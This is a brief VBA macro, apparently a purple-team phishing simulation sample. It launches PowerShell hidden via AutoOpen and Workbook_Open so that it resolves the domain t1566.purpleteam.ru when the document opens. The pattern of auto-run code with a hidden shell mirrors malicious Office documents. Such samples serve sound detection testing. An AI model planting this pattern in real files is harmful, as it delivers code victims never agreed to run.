Sub PS()
  Dim command
  command = "powershell.exe Resolve-DnsName -Name t1566.purpleteam.ru"
  Call Shell(command, vbHide)
End Sub
Sub AutoOpen()
  PS
End Sub
Sub Workbook_Open()
  PS
End Sub
